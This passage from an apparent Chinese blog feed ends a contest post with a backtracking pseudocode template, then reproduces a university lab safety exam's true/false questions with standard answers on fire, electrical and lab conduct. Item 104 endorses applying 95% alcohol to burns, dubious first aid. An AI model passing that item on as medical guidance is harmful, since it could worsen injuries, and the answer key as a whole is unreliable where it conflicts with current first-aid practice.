<p><strong>回溯的一般结构</strong></p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">DFS</span><span class="params">(<span class="keyword">int</span> 当前状态)</span>  </span></span><br><span class="line"><span class="function"></span>&#123;  </span><br><span class="line">      <span class="keyword">if</span>(当前状态为边界状态)  </span><br><span class="line">      &#123;  </span><br><span class="line">        记录或输出  </span><br><span class="line">        <span class="keyword">return</span>;  </span><br><span class="line">      &#125;  </span><br><span class="line">      <span class="keyword">for</span>(i=<span class="number">0</span>;i&lt;n;i++)       <span class="comment">//横向遍历解答树所有子节点  </span></span><br><span class="line">      &#123;  </span><br><span class="line">           <span class="comment">//扩展出一个子状态。  </span></span><br><span class="line">           修改了全局变量  </span><br><span class="line">           <span class="keyword">if</span>(子状态满足约束条件)  </span><br><span class="line">            &#123;  </span><br><span class="line">              dfs(子状态)  </span><br><span class="line">           &#125;  </span><br><span class="line">            恢复全局变量<span class="comment">//回溯部分  </span></span><br><span class="line">      &#125;  </span><br><span class="line">&#125;  </span><br></pre></td></tr></table></figure>
<h6 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h6><p>数字消除这道题做的时候感觉还挺简单的，不知道为什么这道题的通过率反而是最低的，通过率28%提交次数243。解码方式这道最难的题反而通过率高达67%，提交次数91，不知道都怎么做的，有没有百度，我觉得还是自己好好做吧，主要为了提高自己嘛，成绩不那么重要😛。这次比赛在线编辑运行测试数据、提交代码检测结果太慢了，我提交完数字消除这道题后太慢了我才做的笛卡尔积那道题，数字消除还挺有自信的感觉是对的，好久才出评判结果，评判出错后我想着应该好改，就在做笛卡尔积那道题没怎么着急改，所以最后没有及时提交那道题。前三题都还可以，最后一道题感觉有点晕，也是我现在做题少的原因还是太菜了，继续加油吧。</p>
]]></content>
      <categories>
        <category>ACM</category>
        <category>CONTEST</category>
      </categories>
      <tags>
        <tag>阿里云天池赛</tag>
      </tags>
  </entry>
  <entry>
    <title>东北大学软件学院实验室安全考试</title>
    <url>/2020/10/23/%E4%B8%9C%E5%8C%97%E5%A4%A7%E5%AD%A6%E8%BD%AF%E4%BB%B6%E5%AD%A6%E9%99%A2%E5%AE%9E%E9%AA%8C%E5%AE%A4%E5%AE%89%E5%85%A8%E8%80%83%E8%AF%95/</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><p>1、[判断题] <strong>冷却灭火法是将可燃物冷却到其燃点以下，停止燃烧反应。</strong> （分值1.0）<br>                    你未作答            标准答案：                  正确                            </p>
<p>​     2、[判断题] <strong>实验室必须配备符合本室要求的消防器材，消防器材要放置在明显或便于拿取的位置。严禁任何人以任何借口把消防器材移作它用。</strong> （分值1.0）<br>​                    你未作答            标准答案：                  正确                            </p>
<p>​     3、[判断题] <strong>实验室应配备相应的消防器材。参加实验人员要熟悉其存放位置及使用方法并掌握有关的灭火知识。</strong> （分值1.0）<br>​                    你未作答            标准答案：                  正确                            </p>
<a id="more"></a>

<p>​     4、[判断题] <strong>若被火场浓烟所困，应迅速起身跑出火场。</strong> （分值1.0）<br>​                    你未作答            标准答案：                  错误                            </p>
<p>​     5、[判断题] <strong>使用手提灭火器时，拨掉保险销，对准着火点根部用力压下压把，灭火剂喷出，就可灭火。</strong> （分值1.0）<br>​                    你未作答            标准答案：                  正确                            </p>
<p>​     6、[判断题] <strong>消防工作的方针是：“预防为主，防消结合”，实行消防安全责任制。</strong> （分值1.0）<br>​                    你未作答            标准答案：                  正确                            </p>
<p>​     7、[判断题] <strong>建筑物发生火灾时，乘坐电梯疏散即快速又安全省力。</strong> （分值1.0）<br>​                    你未作答            标准答案：                  错误                            </p>
<p>​     8、[判断题] <strong>液体着火时，应用灭火器灭火，不能用水扑救或其它物品扑打。</strong> （分值1.0）<br>​                    你未作答            标准答案：                  正确                            </p>
<p>​     9、[判断题] <strong>消防队在扑救火灾时，有权根据灭火的需要，拆除或者破损临近火灾现场的建筑。</strong> （分值1.0）<br>​                    你未作答            标准答案：                  正确                            </p>
<p>​     10、[判断题] <strong>在附近无水源，身上着火来不及脱衣服时，应就地打滚，将火苗压灭进行自救。</strong> （分值1.0）<br>​                    你未作答            标准答案：                  正确                            </p>
<p>​     11、[判断题] <strong>二氧化碳灭火器使用不当，可能会造成冻伤。</strong> （分值1.0）<br>​                    你未作答            标准答案：                  正确                            </p>
<p>​     12、[判断题] <strong>当发生火情时尽快沿着疏散指示标志和安全出口方向迅速离开火场。</strong>  （分值1.0）<br>​                    你未作答            标准答案：                  正确                            </p>
<p>​     13、[判断题] <strong>大火封门无路可逃时，可用浸湿的被褥、衣物堵塞门缝，向门上泼水降温，以延缓火灾蔓延时间，呼叫待援。</strong> （分值1.0）<br>​                    你未作答            标准答案：                  正确                            </p>
<p>​     14、[判断题] <strong>爆炸是指物质瞬间突然发生物理或化学变化，同时释放出大量的气体和能量（光能、热能、机械能）并伴有巨大声响的现象。</strong> （分值1.0）<br>​                    你未作答            标准答案：                  正确                            </p>
<p>​     15、[判断题] <strong>隔离灭火法是将可燃物与引火源或氧气隔离开来，可防止火势继续扩大。</strong> （分值1.0）<br>​                    你未作答            标准答案：                  正确                            </p>
<p>​     16、[判断题] <strong>火灾发生后，当所有的逃生线路被大火封锁时，应立即退回室内，用手电筒、挥舞衣物、呼叫等方式向窗外发送求救信号，等待救援。</strong> （分值1.0）<br>​                    你未作答            标准答案：                  正确                            </p>
<p>​     17、[判断题] <strong>火灾发生后，受到火势威胁时，要当机立断披上浸湿的衣物、被褥等向安全出口方向冲去。</strong> （分值1.0）<br>​                    你未作答            标准答案：                  正确                            </p>
<p>​     18、[判断题] <strong>火灾发生后，穿过浓烟逃生时，必须尽量贴近地面，并用湿毛巾捂住口鼻。</strong> （分值1.0）<br>​                    你未作答            标准答案：                  正确                            </p>
<p>​     19、[判断题] <strong>扑救毒害性、腐蚀性或燃烧产物毒害性较强的火灾时，必须配戴防护面具。</strong> （分值1.0）<br>​                    你未作答            标准答案：                  正确                            </p>
<p>​     20、[判断题] <strong>扑救气体火灾切忌盲目扑灭火势，首先应切断火势蔓延途径，然后疏散火势中压力容器或受到火焰辐射热威胁的压力容器，不能疏散的部署水枪进行冷却保护。</strong> （分值1.0）<br>​                    你未作答            标准答案：                  正确                            </p>
<p>​     21、[判断题] <strong>如果可燃液体在容器内燃烧时，应从容器的一侧上部向容器中喷射但注意不能将喷流直接喷射在燃烧液面上，防止灭火剂的冲力将可燃液体冲出容器而扩大火势。</strong> （分值1.0）<br>​                    你未作答            标准答案：                  正确                            </p>
<p>​     22、[判断题] <strong>当可燃烧液体呈流淌状燃烧时，应将灭火剂的喷流对准火焰根部由近而远并左右扫射，向前快速推进，直至火焰扑灭。</strong> （分值1.0）<br>​                    你未作答            标准答案：                  正确                            </p>
<p>​     23、[判断题] <strong>火灾发生后，千万不要盲目跳楼，可利用疏散楼梯、阳台、窗口等逃生自救。也可用绳子或把床单、被套等撕成条状连成绳索，紧拴在窗框、铁栏杆等可靠的固定物上，用毛巾、布条等保护手心，顺绳滑下，或下到未着火的楼层进行逃生。</strong> （分值1.0）<br>​                    你未作答            标准答案：                  正确                            </p>
<p>​     24、[判断题] <strong>实验室一旦发生起火，不要惊慌失措，应利用消防器材，采取有效措施控制、扑灭火灾。</strong> （分值1.0）<br>​                    你未作答            标准答案：                  正确                            </p>
<p>​     25、[判断题] <strong>发现实验室楼的配电箱起火，可以用楼内的消火栓放水灭火。</strong> （分值1.0）<br>​                    你未作答            标准答案：                  错误                            </p>
<p>​     26、[判断题] <strong>实验室发生火警、火灾时，应立即采取措施灭火，并报保卫处或119。</strong> （分值1.0）<br>​                    你未作答            标准答案：                  正确                            </p>
<p>​     27、[判断题] <strong>使用激光扫描仪预览和扫描资料时，可以不盖上扫描仪盖子。</strong> （分值1.0）<br>​                    你未作答            标准答案：                  错误                            </p>
<p>​     28、[判断题] <strong>学生、新员工进实验室之前要参加安全教育和培训，经培训、考核合格后方可进入实验室学习与工作；学生要在老师指导下开展实验研究。</strong> （分值1.0）<br>​                    你未作答            标准答案：                  正确                            </p>
<p>​     29、[判断题] <strong>做实验时要爱护实验设备，同时注意自身的安全，避免发生事故。</strong> （分值1.0）<br>​                    你未作答            标准答案：                  正确                            </p>
<p>​     30、[判断题] <strong>实验过程中如发生事故，应冷静妥善地处理，尽量把事故解决在萌芽状态。如较为严重，有危及人身安全可能时，应及时撤离现场，并通知邻近实验室工作人员迅速撤离，尽快报警。</strong> （分值1.0）<br>​                    你未作答            标准答案：                  正确                            </p>
<p>​     31、[判断题] <strong>安全事故处理应本着先人后物的原则，果断地、坚决地快速处置。</strong> （分值1.0）<br>​                    你未作答            标准答案：                  正确                            </p>
<p>​     32、[判断题] <strong>在清洁、维修仪器时，应先断电并确保无人能开启仪器。</strong> （分值1.0）<br>​                    你未作答            标准答案：                  正确                            </p>
<p>​     33、[判断题] <strong>触电紧急救护时，首先应使触电者脱离电源，然后立即进行人工呼吸、心脏按压。</strong> （分值1.0）<br>​                    你未作答            标准答案：                  正确                            </p>
<p>​     34、[判断题] <strong>在触电现场，若触电者已经没有呼吸或脉搏，此时可以判定触电者已经死亡，可以放弃抢救。</strong> （分值1.0）<br>​                    你未作答            标准答案：                  错误                            </p>
<p>​     35、[判断题] <strong>雷电发生时，如果作业人员孤立处于暴露区时，应该立即双手抱膝下蹲，向前弯曲。</strong> （分值1.0）<br>​                    你未作答            标准答案：                  正确                            </p>
<p>​     36、[判断题] <strong>发现有人触电，应立即切断电源，不能直接拉触电者，应用木棒或其它绝缘物将人与带电体分离。</strong> （分值1.0）<br>​                    你未作答            标准答案：                  正确                            </p>
<p>​     37、[判断题] <strong>当有人发生触电事故时，应马上直接将其拉开。</strong> （分值1.0）<br>​                    你未作答            标准答案：                  错误                            </p>
<p>​     38、[判断题] <strong>要保持实验室环境整洁，做到地面、桌面、设备三整洁，减少安全隐患。</strong> （分值1.0）<br>​                    你未作答            标准答案：                  正确                            </p>
<p>​     39、[判断题] <strong>实验室安全工作的中心任务是防止发生人员伤亡、财产和科研资料损失。</strong> （分值1.0）<br>​                    你未作答            标准答案：                  正确                            </p>
<p>​     40、[判断题] <strong>高校实验室发生安全事故的主要原因有：操作不慎、粗心大意、设施老化、缺少防护设施等。</strong> （分值1.0）<br>​                    你未作答            标准答案：                  正确                            </p>
<p>​     41、[判断题] <strong>加强计算机的安全管理，建立病毒防护系统并不断加以更新，重要的数据资料应定期进行备份。</strong> （分值1.0）<br>​                    你未作答            标准答案：                  正确                            </p>
<p>​     42、[判断题] <strong>创造安全、卫生的实验室工作环境，仅仅是实验工作人员的责任。</strong> （分值1.0）<br>​                    你未作答            标准答案：                  错误                            </p>
<p>​     43、[判断题] <strong>使用U盘拷贝资料，应先对U盘杀毒，防止病毒感染 。</strong> （分值1.0）<br>​                    你未作答            标准答案：                  正确                            </p>
<p>​     44、[判断题] <strong>测试数据应进行异地备份。</strong> （分值1.0）<br>​                    你未作答            标准答案：                  正确                            </p>
<p>​     45、[判断题] <strong>有“严禁烟火”警示牌的大楼和实验室，可不必配置必要的消防、冲淋、洗眼、报警和逃生设施和有明显标志。</strong> （分值1.0）<br>​                    你未作答            标准答案：                  错误                            </p>
<p>​     46、[判断题] <strong>在实验室发生事故时，现场人员应迅速组织、指挥，切断事故源，尽量阻止事态蔓延、保护现场；及时有序地疏散学生等人员，对现场已受伤人员作好自助自救、保护人身及财产。</strong> （分值1.0）<br>​                    你未作答            标准答案：                  正确                            </p>
<p>​     47、[判断题] <strong>教师应学习研究有关实验室安全的知识，同时在理论教学和实验中对学生进行安全知识教育、教会学生如何正确使用实验设备和实验操作，教会学生在突发事故发生时如何自我保护、相互救援、安全撤离。</strong>   （分值1.0）<br>​                    你未作答            标准答案：                  正确                            </p>
<p>​     48、[判断题] <strong>早晨、中饭、晚上等几个人员稀少的时间段，要特别注意随手关门，确保实验室财产和个人物品的安全。</strong> （分值1.0）<br>​                    你未作答            标准答案：                  正确                            </p>
<p>​     49、[判断题] <strong>及时淘汰老化、性能不稳又具有安全隐患的仪器设备（如冰箱10年以上，烘箱12年以上）。</strong> （分值1.0）<br>​                    你未作答            标准答案：                  正确                            </p>
<p>​     50、[判断题] <strong>发生各类案件时应立即报案，妥善保护案发现场，若有人受伤，在救人时应尽可能记住现场破坏前的情况（如手机拍照等）。</strong> （分值1.0）<br>​                    你未作答            标准答案：                  正确                            </p>
<p>​     51、[判断题] <strong>实验室人员发生触电时，应迅速切断电源，将触电者上衣解开，取出口中异物，然后进性人工呼吸。当患者恢复呼吸时，应立即送医院。</strong>   （分值1.0）<br>​                    你未作答            标准答案：                  正确                            </p>
<p>​     52、[判断题] <strong>水具有导电性，不宜扑救带电设备的火灾，不能扑救遇水燃烧物质或非水溶性燃烧液体的火灾。</strong> （分值1.0）<br>​                    你未作答            标准答案：                  正确                            </p>
<p>​     53、[判断题] <strong>实验室灭火的方法要针对起因选用合适的方法。一般小火可用湿布、石棉布或沙子覆盖燃烧物即可灭火。</strong> （分值1.0）<br>​                    你未作答            标准答案：                  正确                            </p>
<p>​     54、[判断题] <strong>实验大楼出现火情时千万不要乘电梯，因为电梯可能因停电或失控，同时又因“烟囱效应”，电梯井常常成为浓烟的 流通道。</strong> （分值1.0）<br>​                    你未作答            标准答案：                  正确                            </p>
<p>​     55、[判断题] <strong>使用手提灭火器时，拨掉保险销，握住胶管前端， 对准燃烧物根部用力压下压把，灭火剂喷出，左右扫射，就可灭火。</strong> （分值1.0）<br>​                    你未作答            标准答案：                  正确                            </p>
<p>​     56、[判断题] <strong>有“严禁烟火”警示牌的大楼和实验室，可不必配 置必要的消防、冲淋、洗眼、报警和逃生设施和有明显标志。</strong> （分值1.0）<br>​                    你未作答            标准答案：                  错误                            </p>
<p>​     57、[判断题] <strong>实验大楼因出现火情发生浓烟时应迅速离开，当浓烟已穿入实验室内时，要沿地面匍匐前进，因地面层新鲜空气较多，不易中毒而窒息，有利于逃生。当逃到门口时，千万不要站立开门，以避免被大量浓烟熏倒。</strong> （分值1.0）<br>​                    你未作答            标准答案：                  正确                            </p>
<p>​     58、[判断题] <strong>消防队在扑救火灾时，有权根据灭火的需要，拆除或者破损临近火灾现场的建筑。</strong> （分值1.0）<br>​                    你未作答            标准答案：                  正确                            </p>
<p>​     59、[判断题] <strong>在扑灭电气火灾的明火时，用气体灭火器扑灭。</strong> （分值1.0）<br>​                    你未作答            标准答案：                  正确                            </p>
<p>​     60、[判断题] <strong>发现火灾时，单位或个人应该先自救，当自救无效、火越着越大时，再拨打火警电话119。</strong> （分值1.0）<br>​                    你未作答            标准答案：                  错误                            </p>
<p>​     61、[判断题] <strong>用灭火器灭火时,灭火器的喷射口应该对准火焰的中部。</strong> （分值1.0）<br>​                    你未作答            标准答案：                  错误                            </p>
<p>​     62、[判断题] <strong>灭火器材设置点附近不能堆放物品,以免影响灭火器的取用。</strong> （分值1.0）<br>​                    你未作答            标准答案：                  正确                            </p>
<p>​     63、[判断题] <strong>扑救气体火灾切忌盲目扑灭火势，首先应切断火势蔓延途径，然后疏散火势中压力容器或受到火焰辐射热威胁的压力 容器，不能疏散的部署水枪进行冷却保护。</strong> （分值1.0）<br>​                    你未作答            标准答案：                  正确                            </p>
<p>​     64、[判断题] <strong>若宿舍门外已被大火封死，要紧闭房门，用湿毛巾 等堵塞门缝，在室内等待救援。</strong> （分值1.0）<br>​                    你未作答            标准答案：                  正确                            </p>
<p>​     65、[判断题] <strong>火灾发生后，穿过浓烟逃生时，必须尽量贴近地面，并用湿毛巾捂住口鼻。</strong> （分值1.0）<br>​                    你未作答            标准答案：                  正确                            </p>
<p>​     66、[判断题] <strong>万一发生了火灾，不管是否是电气方面引起的，首先要想办法迅速切断火灾范围内的电源。</strong> （分值1.0）<br>​                    你未作答            标准答案：                  正确                            </p>
<p>​     67、[判断题] <strong>火灾对实验室构成的威胁最为严重，最为直接。应加强对火灾三要素（易燃物、助燃物、点火源）的控制。</strong> （分值1.0）<br>​                    你未作答            标准答案：                  正确                            </p>
<p>​     68、[判断题] <strong>灭火器按其移动形式可分为：手提式和推车式。</strong> （分值1.0）<br>​                    你未作答            标准答案：                  正确                            </p>
<p>​     69、[判断题] <strong>不得堵塞实验室逃生通道。</strong> （分值1.0）<br>​                    你未作答            标准答案：                  正确                            </p>
<p>​     70、[判断题] <strong>液体着火时，应用灭火器灭火，不能用水扑救或其 它物品扑打。</strong> （分值1.0）<br>​                    你未作答            标准答案：                  正确                            </p>
<p>​     71、[判断题] <strong>岗位消防安全“四知四会”中的“四会”是指：会报警，会使用消防器材，会扑救初期火灾，会逃生自救</strong> （分值1.0）<br>​                    你未作答            标准答案：                  正确                            </p>
<p>​     72、[判断题] <strong>身上着火被熄灭后,应马上把粘在皮肤上的衣物脱下来。</strong> （分值1.0）<br>​                    你未作答            标准答案：                  错误                            </p>
<p>​     73、[判断题] <strong>实验室必须配备符合本室要求的消防器材，消防器材要放置在明显或便于拿取的位置。严禁任何人以任何借口把消防 器材移作它用。</strong> （分值1.0）<br>​                    你未作答            标准答案：                  正确                            </p>
<p>​     74、[判断题] <strong>电气设备着火，首先必须采取的措施是灭火。</strong> （分值1.0）<br>​                    你未作答            标准答案：                  错误                            </p>
<p>​     75、[判断题] <strong>实验室发生非火灾类事故，应立即报告单位负责人 和学校保卫处，设立警戒区并撤离无关人员，以减轻潜在危害。</strong> （分值1.0）<br>​                    你未作答            标准答案：                  正确                            </p>
<p>​     76、[判断题] <strong>火灾发生后，受到火势威胁时，要当机立断披上浸湿的衣物、被褥等向安全出口方向冲去。</strong> （分值1.0）<br>​                    你未作答            标准答案：                  正确                            </p>
<p>​     77、[判断题] <strong>在熟睡时，听到火警信号后正确的做法是：1、用手试一试门是否热，如是冷的，可开门逃生；2、准备好湿毛巾；3、切勿随意跳楼，自 制救生绳索后再设法安全着落；4、利用自然条件作为救生滑道。</strong> （分值1.0）<br>​                    你未作答            标准答案：                  正确                            </p>
<p>​     78、[判断题] <strong>同学发现宿舍楼的电闸箱起火，可以用楼内的消火栓灭火。</strong> （分值1.0）<br>​                    你未作答            标准答案：                  错误                            </p>
<p>​     79、[判断题] <strong>在着火和救火时，若衣服着火，要赶紧跑到空旷处用灭火器扑灭。</strong> （分值1.0）<br>​                    你未作答            标准答案：                  错误                            </p>
<p>​     80、[判断题] <strong>实验室内出现火情逃到室外走廊时，要尽量做到随手关门，这样一来可阻挡火势随人运动而迅速蔓延，增加逃生的有效时间。</strong>  （分值1.0）<br>​                    你未作答            标准答案：                  正确                            </p>
<p>​     81、[判断题] <strong>实验大楼因出现火情发生浓烟时应迅速离开，当浓烟已穿入实验室内时，要沿地面匍匐前进，因地面层新鲜空气较多，不易中毒而窒息，有利于逃生。当逃到门口时，千万不要站立开门，以避免被大量浓烟熏倒。</strong>  （分值1.0）<br>​                    你未作答            标准答案：                  正确                            </p>
<p>​     82、[判断题] <strong>实验室常用的灭火方法：用水灭火、砂土灭火、灭火器。</strong> （分值1.0）<br>​                    你未作答            标准答案：                  正确                            </p>
<p>​     83、[判断题] <strong>火灾对实验室构成的威胁最为严重，最为直接。应加强对火灾三要素（易燃物、助燃物、点火源）的控制。</strong> （分值1.0）<br>​                    你未作答            标准答案：                  正确                            </p>
<p>​     84、[判断题] <strong>仪器设备用电或线路发生故障着火时，应立即切断现场电源，将人员疏散，并组织人员用灭火器进行灭火。</strong>  （分值1.0）<br>​                    你未作答            标准答案：                  正确                            </p>
<p>​     85、[判断题] <strong>单位消防安全制度主要包括以下内容：消防安全教育、培训；防火巡查、检查；安全疏散设施管理；消防（控制室）值班；消防设施、器材维护管理；火灾隐患整改；用火、用电安全管理；易燃易爆危险物品和场所防火防爆；专职和义务消防队的组织管理；灭火和应急疏散预案演练；燃气和电气的检查管理（包括防雷、防静电）；消防安全工作考评和奖惩；其他必要的消防安全内容。</strong> （分值1.0）<br>​                    你未作答            标准答案：                  正确                            </p>
<p>​     86、[判断题] <strong>灭火的四种方法是隔离法、窒息法、冷却法、化学抑制法。</strong> （分值1.0）<br>​                    你未作答            标准答案：                  正确                            </p>
<p>​     87、[判断题] <strong>在室外灭火时，应站在上风位置。</strong> （分值1.0）<br>​                    你未作答            标准答案：                  正确                            </p>
<p>​     88、[判断题] <strong>在熟睡时，听到火警信号后正确的做法是：1、用手试一试门是否热，如是冷的，可开门逃生；2、准备好湿毛巾；3、切勿随意跳楼，自制救生绳索后再设法安全着落；4、利用自然条件作为救生滑道。</strong> （分值1.0）<br>​                    你未作答            标准答案：                  正确                            </p>
<p>​     89、[判断题] <strong>电气设备发生火灾时，应注意：1、电气设备可能带电，可能发生触电事故；2、某些电气设备充有大量的油，可能发生喷油甚至爆炸。</strong> （分值1.0）<br>​                    你未作答            标准答案：                  正确                            </p>
<p>​     90、[判断题] <strong>实验大楼出现火情时千万不要乘电梯，因为电梯可能因停电或失控，同时又因“烟囱效应”，电梯井常常成为浓烟的流通道。</strong>   （分值1.0）<br>​                    你未作答            标准答案：                  正确                            </p>
<p>​     91、[判断题] <strong>实验室内出现火情，若被困在室内时，应迅速打开水龙头，将所有可盛水的容器装满水，并把毛巾打湿。用湿毛巾捂嘴，可以遮住部分浓烟不被吸入。</strong> （分值1.0）<br>​                    你未作答            标准答案：                  正确                            </p>
<p>​     92、[判断题] <strong>实验室灭火的方法要针对起因选用合适的方法。一般小火可用湿布、石棉布或沙子覆盖燃烧物即可灭火。</strong> （分值1.0）<br>​                    你未作答            标准答案：                  正确                            </p>
<p>​     93、[判断题] <strong>大火封门无路可逃时，可用浸湿的被褥、衣物堵塞门缝，向门上泼水降温，以延缓火灾蔓延时间，呼叫待援。</strong> （分值1.0）<br>​                    你未作答            标准答案：                  正确                            </p>
<p>​     94、[判断题] <strong>消防工作的方针是：“预防为主，防消结合”，实行消防安全责任制。</strong> （分值1.0）<br>​                    你未作答            标准答案：                  正确                            </p>
<p>​     95、[判断题] <strong>当发生火情时尽快沿着疏散指示标志和安全出口方向迅速离开火场。</strong> （分值1.0）<br>​                    你未作答            标准答案：                  正确                            </p>
<p>​     96、[判断题] <strong>当电气设备发生火灾后，如果可能应当先断电后灭火。</strong> （分值1.0）<br>​                    你未作答            标准答案：                  正确                            </p>
<p>​     97、[判断题] <strong>火灾发生后，当所有的逃生线路被大火封锁时，应立即退回室内，用手电筒、挥舞衣物、呼叫等方式向窗外发送求救 信号，等待救援。</strong> （分值1.0）<br>​                    你未作答            标准答案：                  正确                            </p>
<p>​     98、[判断题] <strong>所有的火灾刚开始时都是小火，随着火灾的发展输出的热量越大，火灾蔓延的速度和范围也愈大，所以扑灭初起火灾 最容易的。</strong> （分值1.0）<br>​                    你未作答            标准答案：                  正确                            </p>
<p>​     99、[判断题] <strong>燃烧必须具备可燃物、助燃物和点火源三大条件，缺一不可。因此，可以采取尽量隔离的方式来防止实验室火灾的发生。</strong> （分值1.0）<br>​                    你未作答            标准答案：                  正确                            </p>
<p>​     100、[判断题] <strong>被困在电梯中应尽快扒开门脱险。</strong> （分值1.0）<br>​                    你未作答            标准答案：                  错误                            </p>
<p>​     101、[判断题] <strong>电气设备着火时，可以用水扑灭。</strong> （分值1.0）<br>​                    你未作答            标准答案：                  错误                            </p>
<p>​     102、[判断题] <strong>电气线路着火，要先切断电源，再用干粉灭火器或二氧化碳灭火器灭火，不可直接泼水灭火，以防触电或电气爆炸伤人。</strong> （分值1.0）<br>​                    你未作答            标准答案：                  正确                            </p>
<p>​     103、[判断题] <strong>灭火器按其移动形式可分为：手提式和推车式。</strong> （分值1.0）<br>​                    你未作答            标准答案：                  正确                            </p>
<p>​     104、[判断题] <strong>实验中遇到一般烫伤和烧伤，不要弄破水泡，在伤口处用95%的酒精轻涂伤口，涂上烫伤膏或涂一层凡士林油，再用纱布包扎。</strong>   （分值1.0）<br>​                    你未作答            标准答案：                  正确                            </p>
<p>​     105、[判断题] <strong>为了防止盗窃事件的发生，临时离开实验室必须关门。</strong> （分值1.0）<br>​                    你未作答            标准答案：                  正确                            </p>
<p>​     106、[判断题] <strong>实验室内可以使用电炉、微波炉、电磁炉、电饭煲等取暖、做饭。</strong> （分值1.0）<br>​                    你未作答            标准答案：                  错误                            </p>
<p>​     107、[判断题] <strong>实验室内可以堆放个人物品。</strong> （分值1.0）<br>​                    你未作答            标准答案：                  错误                            </p>
<p>​     108、[判断题] <strong>节假日或假期在实验室做实验必须经导师批准，并报院系备案。</strong> （分值1.0）<br>​                    你未作答            标准答案：                  正确                            </p>
<p>​     109、[判断题] <strong>实验结束后，要关闭设备，断开电源，并将有关实验用品整理好。</strong> （分值1.0）<br>​                    你未作答            标准答案：                  正确                            </p>
<p>​     110、[判断题] <strong>电源插座、接线板、电线的容量应满足电器功率的需要。</strong> （分值1.0）<br>​                    你未作答            标准答案：                  正确                            </p>
<p>​     111、[判断题] <strong>为避免线路负荷过大，而引起火灾，功率1000瓦以上的设备不得共用一个接线板。</strong> （分值1.0）<br>​                    你未作答            标准答案：                  正确                            </p>
<p>​     112、[判断题] <strong>对于触电事故，应立即切断电源或用有绝缘性能的木棍棒挑开和隔绝电流，如果触电者的衣服干燥，又没有紧缠住身上，可以用一只手抓住他的衣服，拉离带电体；但救护人不得接触触电者的皮肤，也不能抓他的鞋。</strong> （分值1.0）<br>​                    你未作答            标准答案：                  正确                            </p>
<p>​     113、[判断题] <strong>实验室内应使用空气开关并配备必要的漏电保护器；电气设备应配备足够的用电功率和电线，不得超负荷用电；电气设备和大型仪器须接地良好，对电线老化等隐患要定期检查并及时排除。</strong> （分值1.0）<br>​                    你未作答            标准答案：                  正确                            </p>
<p>​     114、[判断题] <strong>大型仪器使用中，应注意仪器设备的接地、电磁辐射、网络等安全事项，避免事故发生。</strong> （分值1.0）<br>​                    你未作答            标准答案：                  正确                            </p>
<p>​     115、[判断题] <strong>实验室内的电线、开关、灯头、插头、插座等一切电器用具，要经常检查是否完好，有无漏电、潮湿、霉烂等情况。一旦有问题应立即报修。</strong>   （分值1.0）<br>​                    你未作答            标准答案：                  正确                            </p>
<p>​     116、[判断题] <strong>实验室内禁止抽烟、进食。</strong> （分值1.0）<br>​                    你未作答            标准答案：                  正确                            </p>
<p>​     117、[判断题] <strong>发现被盗或人为破坏，应保护现场并立即报告保卫处。</strong> （分值1.0）<br>​                    你未作答            标准答案：                  正确                            </p>
<p>​     118、[判断题] <strong>实验室发生非火灾类事故，应立即报告单位负责人和学校保卫处，设立警戒区并撤离无关人员，以减轻潜在危害。</strong> （分值1.0）<br>​                    你未作答            标准答案：                  正确                            </p>
<p>​     119、[判断题] <strong>实验室内不得停放自行车、电动车、汽车。</strong> （分值1.0）<br>​                    你未作答            标准答案：                  正确                            </p>
<p>​     120、[判断题] <strong>只要不影响实验，可以在实验室洁净区域铺床睡觉。</strong> （分值1.0）<br>​                    你未作答            标准答案：                  错误                            </p>
<p>​     121、[判断题] <strong>在不影响实验室周围的走廊通行的情况,可以堆放仪器等杂物。</strong> （分值1.0）<br>​                    你未作答            标准答案：                  错误                            </p>
<p>​     122、[判断题] <strong>有易燃易爆危险品的实验室禁止使用明火。</strong> （分值1.0）<br>​                    你未作答            标准答案：                  正确                            </p>
<p>​     123、[判断题] <strong>不能将实验室易燃易爆物品带出实验室。</strong> （分值1.0）<br>​                    你未作答            标准答案：                  正确                            </p>
<p>​     124、[判断题] <strong>离开实验室前应检查门、窗、水龙头是否关好，通风设备、饮水设施、计算机、空调等是否已切断电源。</strong> （分值1.0）<br>​                    你未作答            标准答案：                  正确                            </p>
<p>​     125、[判断题] <strong>实验仪器使用时要有人在场，不得擅自离开。</strong> （分值1.0）<br>​                    你未作答            标准答案：                  正确                            </p>
<p>​     126、[判断题] <strong>实验进行前要了解实验仪器的使用说明及注意事项，实验过程中要严格按照操作规程进行操作。</strong> （分值1.0）<br>​                    你未作答            标准答案：                  正确                            </p>
<p>​     127、[判断题] <strong>未经允许不得随意拆卸实验仪器和设备。</strong> （分值1.0）<br>​                    你未作答            标准答案：                  正确                            </p>
<p>​     128、[判断题] <strong>学生进入实验室首先要了解实验室的安全注意事项。</strong> （分值1.0）<br>​                    你未作答            标准答案：                  正确                            </p>
<p>​     129、[判断题] <strong>可以用潮湿的手碰开关、电线和电器。</strong> （分值1.0）<br>​                    你未作答            标准答案：                  错误                            </p>
<p>​     130、[判断题] <strong>当手、脚或身体沾湿或站在潮湿的地板上时，切勿启动电源开关和触摸电气用具。</strong> （分值1.0）<br>​                    你未作答            标准答案：                  正确                            </p>
<p>​     131、[判断题] <strong>在实验室同时使用多种电气设备时，其总用电量和分线用电量均应小于设计容量。</strong> （分值1.0）<br>​                    你未作答            标准答案：                  正确                            </p>
<p>​     132、[判断题] <strong>计算机使用完毕后，应将显示器的电源关闭，以避免电源接通，产生瞬间的冲击电流。</strong> （分值1.0）<br>​                    你未作答            标准答案：                  正确                            </p>
<p>​     133、[判断题] <strong>触电事故是因电流流过人体而造成的。</strong> （分值1.0）<br>​                    你未作答            标准答案：                  正确                            </p>
<p>​     134、[判断题] <strong>为了预防电击（触电），电气设备的金属外壳须接地，最好是埋设接地电阻很小专用地线。</strong> （分值1.0）<br>​                    你未作答            标准答案：                  正确                            </p>
<p>​     135、[判断题] <strong>为保证安全用电，配电箱内所用的保险丝应该尽量粗。</strong> （分值1.0）<br>​                    你未作答            标准答案：                  错误                            </p>
<p>​     136、[判断题] <strong>在照明电路上可以不用安装漏电保护器。</strong> （分值1.0）<br>​                    你未作答            标准答案：                  错误                            </p>
